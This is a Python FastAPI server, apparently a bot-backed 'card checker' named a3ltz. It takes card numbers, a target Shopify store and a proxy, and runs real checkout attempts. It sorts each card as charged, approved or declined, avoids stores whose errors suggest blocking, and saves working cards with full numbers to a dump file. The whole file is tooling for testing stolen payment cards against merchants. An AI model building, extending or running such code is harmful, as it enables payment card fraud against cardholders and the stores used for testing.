from __future__ import annotations

import asyncio
import datetime
import json
import logging
import os
import random
import sys
import threading as _threading
import time
import warnings
from contextlib import asynccontextmanager
from pathlib import Path
from typing import Optional

warnings.filterwarnings("ignore")

_here = Path(__file__).resolve().parent
if str(_here) not in sys.path:
    sys.path.insert(0, str(_here))

import uvicorn
from fastapi import FastAPI, Request, Query
from fastapi.responses import JSONResponse, HTMLResponse

import auto
import auto_async
from auto import CheckStatus

try:
    import psutil
    _MEMORY_CHECK = True
except ImportError:
    psutil = None
    _MEMORY_CHECK = False

PORT             = int(os.environ.get("CHECKER_PORT", os.environ.get("PORT", "6777")))
REQUEST_TIMEOUT  = 120
MEMORY_LIMIT_PCT = 90

logging.basicConfig(level=logging.INFO, format="%(message)s",
                    handlers=[logging.StreamHandler()])
_log = logging.getLogger("main")

_PROXY_SIGNS = ("407", "CONNECT tunnel", "libcurl", "Proxy Authentication",
                "curl: (56)", "curl: (7)")

_SITE_TTL = {
    "returned 429":              600,
    "returned 503":              180,
    "returned 403":             1800,
    "returned 402":              300,
    "returned 422":              300,
    "returned 404":            86400,
    "could not extract session": 300,
    "curl: (28)":                 90,
    "Step 0 failed":              90,
}

_dead_sites: dict[str, float] = {}
_dead_lock   = _threading.Lock()
_mem_cache: dict = {"val": False, "ts": 0.0}

def _mark_dead(site_url: str, error_str: str) -> None:
    if not error_str or any(s in error_str for s in _PROXY_SIGNS):
        return
    for pattern, ttl in _SITE_TTL.items():
        if pattern in error_str:
            with _dead_lock:
                _dead_sites[site_url] = time.time() + ttl
            return

def _exc_text(exc: BaseException | None) -> str:
    if exc is None:
        return ""
    if exc.args and exc.args[0]:
        return str(exc.args[0])
    return str(exc) or ""

_APPROVED_KEYWORDS = (
    "3DS_REQUIRED", "3DS_AUTHENTICATION", "3DS_AUTH",  # دقيق — بدون "3DS" الفضفاض
    "AUTHENTICATION_REQUIRED",
    "INSUFFICIENT_FUNDS", "INSUFFICIENT FUNDS", "NOT SUFFICIENT FUNDS",
    "INCORRECT_CVC", "INVALID_CVC", "SECURITY_CODE",
    "CVV", "CVC_MISMATCH",
)
_DECLINED_KEYWORDS = (
    "CARD_DECLINED", "DECLINED", "DO_NOT_HONOR", "GENERIC_ERROR",
    "EXPIRED_CARD", "PICKUP_CARD",
    "LOST_CARD", "STOLEN_CARD", "FRAUD", "CALL_ISSUER",
    "TRANSACTION_NOT_ALLOWED", "PROCESSING_ERROR",
    "PAYMENT_METHOD_NOT_AVAILABLE", "AUTHENTICATION_FAILED",
    "INVALID_NUMBER", "INCORRECT_NUMBER",
)
_INFRA_ERROR_KEYWORDS = (
    "STEP ", "FAILED:", "RETURNED 4", "RETURNED 5",
    "RETURNED 402", "RETURNED 422", "RETURNED 429",
    "CURL:", "CONNECT TUNNEL", "COULD NOT EXTRACT", "COULD NOT",
    "POLL ", "EXCEEDED 30", "PROXY", "TIMEOUT", "TIMED OUT",
    "INVENTORYRESERVATIONFAILURE", "NO SHOPIFY", "SESSION", "LIBCURL",
)

def normalize_result(status: str, result_str: str) -> tuple[str, str]:
    resp = (result_str or "").strip() or "UNKNOWN"
    up   = resp.upper()

    if any(k in up for k in ("ORDER_PLACED", "SUCCESSFULRECEIPT", "PROCESSEDRECEIPT")):
        return "charged", resp
    if any(k in up for k in _APPROVED_KEYWORDS):
        return "approved", resp
    if status == "declined" or any(k in up for k in _DECLINED_KEYWORDS):
        if not any(k in up for k in _INFRA_ERROR_KEYWORDS):
            return "declined", resp
    if status in ("charged", "approved", "declined"):
        return status, resp
    if any(k in up for k in _INFRA_ERROR_KEYWORDS):
        return "error", resp
    if resp != "UNKNOWN":
        return "declined", resp
    return "error", resp

def normalize_proxy(proxy: str) -> str:
    return auto.normalize_proxy(proxy)

async def check_card_async(cc: str, site: str, proxy: str) -> dict:
    proxy_url = ""
    try:
        proxy_url = normalize_proxy(proxy)
    except Exception:
        pass

    try:
        res = await auto_async.run_checkout_for_card_async(site, cc, proxy_url)
    except Exception as e:
        err_msg = str(e).replace("\n", " ")[:150]
        _mark_dead(site, err_msg)
        return {
            "status": "error", "result": err_msg,
            "amount": "0", "site": site, "receipt_url": "", "card": cc,
        }

    status_map = {
        CheckStatus.CHARGED:  "charged",
        CheckStatus.APPROVED: "approved",
        CheckStatus.DECLINED: "declined",
        CheckStatus.ERROR:    "error",
    }
    status     = status_map.get(res.status, "error")
    result_str = res.status_code or _exc_text(res.error) or "UNKNOWN"
    status, result_str = normalize_result(status, result_str)

    if status == "error":
        _mark_dead(site, result_str)

    if status in ("charged", "approved", "declined"):
        _log.info("%s|%s", cc, result_str)

    currency   = (getattr(res, "currency", None) or "USD").upper()
    raw_amount = res.amount or "0"
    _CURRENCY_SYMBOLS = {
        "USD": "$", "EUR": "€", "GBP": "£", "CAD": "CA$",
        "AUD": "A$", "JPY": "¥", "CHF": "CHF ", "SEK": "kr ",
        "NOK": "kr ", "DKK": "kr ", "NZD": "NZ$", "SGD": "S$",
        "HKD": "HK$", "MXN": "MX$", "BRL": "R$", "INR": "₹",
        "KRW": "₩", "AED": "AED ", "SAR": "SAR ", "QAR": "QAR ",
        "KWD": "KD ", "BHD": "BD ", "OMR": "OMR ", "JOD": "JD ",
        "TRY": "₺", "PLN": "zł ", "CZK": "Kč ", "HUF": "Ft ",
        "ZAR": "R ", "MYR": "RM ", "THB": "฿", "IDR": "Rp ",
        "PHP": "₱", "VND": "₫", "ILS": "₪",
    }
    symbol = _CURRENCY_SYMBOLS.get(currency, currency + " ")

    return {
        "status":      status,
        "result":      result_str,
        "amount":      raw_amount,           # رقم مجرد — البوت يضيف الرمز بنفسه
        "amount_fmt":  f"{symbol}{raw_amount}" if raw_amount not in ("0", "-", "") else raw_amount,
        "currency":    currency,
        "site":        site,
        "receipt_url": res.receipt_url or "",
        "card":        cc,
    }

_STATS_FILE = "stats.json"
_stats_lock = _threading.Lock()

def _ts_now() -> str:
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def _load_stats() -> tuple[dict, dict]:
    """تحميل الإحصاءات من الملف عند بدء التشغيل."""
    default_stats = {
        "active": 0, "total": 0,
        "charged": 0, "approved": 0, "declined": 0, "errors": 0,
        "by": "a3ltz",
        "started": time.strftime("%Y-%m-%d %H:%M:%S"),
        "last_charged": None, "last_approved": None, "last_declined": None,
    }
    default_counters: dict[str, dict] = {}
    if not os.path.exists(_STATS_FILE):
        return default_stats, default_counters
    try:
        with open(_STATS_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
        stats    = data.get("stats", default_stats)
        counters = data.get("counters", default_counters)
        stats["active"] = 0  # active دائماً يبدأ من صفر عند إعادة التشغيل
        return stats, counters
    except Exception:
        return default_stats, default_counters

def _persist_stats() -> None:
    """حفظ الإحصاءات في الملف — يُستدعى بعد كل تحديث."""
    try:
        with open(_STATS_FILE, "w", encoding="utf-8") as f:
            json.dump({"stats": _stats, "counters": _response_counters},
                      f, ensure_ascii=False)
    except Exception:
        pass

_stats, _response_counters = _load_stats()

def _track_response(result_str: str, category: str) -> None:
    key = (result_str or "UNKNOWN").strip().upper() or "UNKNOWN"
    cat_map = {"charged":"charged","approved":"approved","declined":"declined",
               "error":"errors","errors":"errors"}
    norm_cat = cat_map.get(category, "errors")
    with _stats_lock:
        if key not in _response_counters:
            _response_counters[key] = {"count": 0, "category": norm_cat}
        _response_counters[key]["count"] += 1
        _persist_stats()

def _is_memory_exceeded() -> bool:
    if not _MEMORY_CHECK or psutil is None:
        return False
    now = time.time()
    if now - _mem_cache["ts"] < 5.0:
        return _mem_cache["val"]
    try:
        val = psutil.virtual_memory().percent >= MEMORY_LIMIT_PCT
    except Exception:
        val = False
    _mem_cache["val"] = val
    _mem_cache["ts"]  = now
    return val

async def _save_dump(card: str, site: str, status: str, result: str, amount: str, currency: str = "USD"):
    ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {status.upper()} | {card} | {site} | {result} | {amount}\n"
    def _write():
        try:
            with open("dump.txt", "a", encoding="utf-8") as f:
                f.write(line)
                f.flush()
        except Exception:
            pass
    await asyncio.to_thread(_write)

@asynccontextmanager
async def _lifespan(app: FastAPI):
    yield

app = FastAPI(title="a3ltz", docs_url=None, redoc_url=None, lifespan=_lifespan)

# ── Middleware: يعالج الطلبات اللي تجي بـ absolute URL مثل http%3A//ip:port/a3ltz-check
# هذا يصير لما الـ proxy client يرسل الـ request بشكل غلط
from starlette.middleware.base import BaseHTTPMiddleware
from starlette.requests import Request as StarletteRequest
import urllib.parse as _urlparse

class AbsoluteURLMiddleware(BaseHTTPMiddleware):
    async def dispatch(self, request: StarletteRequest, call_next):
        raw_path = request.url.path
        # لو الـ path يبدأ بـ http أو http%3A — decoded absolute URL
        decoded = _urlparse.unquote(raw_path)
        if decoded.startswith("http://") or decoded.startswith("https://"):
            # استخرج الـ path الحقيقي بعد host:port
            parsed   = _urlparse.urlparse(decoded)
            new_path = parsed.path or "/"
            # أعد بناء الـ scope بالـ path الصح
            request.scope["path"]        = new_path
            request.scope["raw_path"]    = new_path.encode()
            # دمج الـ query strings — الأصلي + اللي في الـ absolute URL
            orig_qs = request.scope.get("query_string", b"").decode()
            abs_qs  = parsed.query or ""
            merged  = "&".join(filter(None, [orig_qs, abs_qs]))
            request.scope["query_string"] = merged.encode()
        return await call_next(request)

app.add_middleware(AbsoluteURLMiddleware)

_INFRA_KEYS = (
    "STEP ", "FAILED:", "RETURNED 4", "RETURNED 5",
    "CURL:", "CONNECT TUNNEL", "COULD NOT", "POLL ",
    "EXCEEDED 30", "PROXY", "TIMEOUT", "TIMED OUT",
    "LIBCURL", "SESSION", "SOCKET", "SSL", "NETWORK",
)

def _is_infra(key: str) -> bool:
    k = key.upper()
    return any(p in k for p in _INFRA_KEYS)

@app.get("/a3ltz-status")
async def route_status():
    with _stats_lock:
        snap     = dict(_stats)
        counters = dict(_response_counters)

    total    = snap["total"]
    charged  = snap["charged"]
    approved = snap["approved"]
    declined = snap["declined"]
    errors   = snap["errors"]
    active   = snap["active"]

    def rate(n):
        return round(n / total * 100, 2) if total > 0 else 0.0

    # أكثر الردود تكراراً — بدون Error/infra
    top_responses = sorted(
        [{"msg": k, "count": v["count"], "category": v["category"]}
         for k, v in counters.items() if not _is_infra(k)],
        key=lambda x: x["count"], reverse=True
    )[:20]

    return JSONResponse({
        "ok":            True,
        "api":           "a3ltz",
        "started":       snap["started"],
        "active":        active,
        "total":         total,
        "charged":       charged,
        "approved":      approved,
        "declined":      declined,
        "errors":        errors,
        "charge_rate":   rate(charged),
        "approve_rate":  rate(approved),
        "decline_rate":  rate(declined),
        "error_rate":    rate(errors),
        "hit_rate":      rate(charged + approved),
        "last_charged":  snap.get("last_charged"),
        "last_approved": snap.get("last_approved"),
        "last_declined": snap.get("last_declined"),
        "top_responses": top_responses,
    })

@app.api_route("/a3ltz-check", methods=["GET", "POST"])
async def route_check(
    request: Request,
    cc:    Optional[str] = Query(None),
    site:  Optional[str] = Query(None),
    proxy: Optional[str] = Query(None),
):
    if _is_memory_exceeded():
        return JSONResponse({"error": "Server is busy"}, status_code=503)

    if request.method == "POST":
        try:
            body  = await request.json()
            cc    = body.get("cc",    cc)
            site  = body.get("site",  site)
            proxy = body.get("proxy", proxy)
        except Exception:
            pass

    if not cc:
        return JSONResponse({"error": "Missing cc"}, status_code=400)
    if not site:
        return JSONResponse({"error": "Missing site"}, status_code=400)

    with _stats_lock:
        _stats["active"] += 1
        _stats["total"]  += 1
    t0 = time.monotonic()

    try:
        result = await asyncio.wait_for(
            check_card_async(cc, site, proxy or ""),
            timeout=REQUEST_TIMEOUT,
        )
    except asyncio.TimeoutError:
        with _stats_lock:
            _stats["errors"] += 1
            _stats["active"] -= 1
        _log.info("%s|Timeout", cc)
        # don't track timeout in response counters — proxy/infra noise
        return JSONResponse({
            "Status":      "SiteError",
            "Response":    "Timeout",
            "Price":       "-",
            "Gateway":     "Shopify",
            "Card":        cc,
            "site":        site,
            "receipt_url": "",
            "elapsed":     round(time.monotonic() - t0, 2),
        })
    except Exception as e:
        with _stats_lock:
            _stats["errors"] += 1
            _stats["active"] -= 1
        err_str = str(e)[:150]
        _log.info("%s|%s", cc, err_str[:80])
        # don't track exception in response counters — proxy/infra noise
        return JSONResponse({
            "Status":      "SiteError",
            "Response":    err_str,
            "Price":       "-",
            "Gateway":     "Shopify",
            "Card":        cc,
            "site":        site,
            "receipt_url": "",
            "elapsed":     round(time.monotonic() - t0, 2),
        })

    elapsed     = round(time.monotonic() - t0, 2)
    card_status = result.get("status", "error")
    result_str  = result.get("result", "")

    with _stats_lock:
        stat_key = {"charged": "charged", "approved": "approved", "declined": "declined"}.get(card_status, "errors")
        _stats[stat_key] += 1
        _stats["active"] -= 1
        now_ts = _ts_now()
        if card_status == "charged":
            _stats["last_charged"]  = now_ts
        elif card_status == "approved":
            _stats["last_approved"] = now_ts
        elif card_status == "declined":
            _stats["last_declined"] = now_ts
        _persist_stats()

    if card_status in ("charged", "approved", "declined"):
        _track_response(result_str, card_status)

    if card_status in ("charged", "approved"):
        await _save_dump(cc, site, card_status,
                         result_str, result.get("amount", "0"),
                         result.get("currency", "USD"))

    bot_status = {
        "charged":  "Charged",
        "approved": "Approved",
        "declined": "Declined",
    }.get(card_status, "SiteError")

    _result_str = result.get("result", "")
    if card_status == "charged":
        _result_str = "ORDER_PLACED"
    elif card_status == "approved" and "3DS" in _result_str.upper():
        _result_str = "3DS_REQUIRED"

    return JSONResponse({
        "Status":      bot_status,
        "Response":    _result_str,
        "Price":       result.get("amount", "-"),
        "Currency":    result.get("currency", "USD"),
        "Gateway":     "Shopify",
        "Card":        cc,
        "site":        site,
        "receipt_url": result.get("receipt_url", ""),
        "elapsed":     elapsed,
    })

if __name__ == "__main__":
    uvicorn.run("main:app", host="0.0.0.0", port=PORT, log_level="info")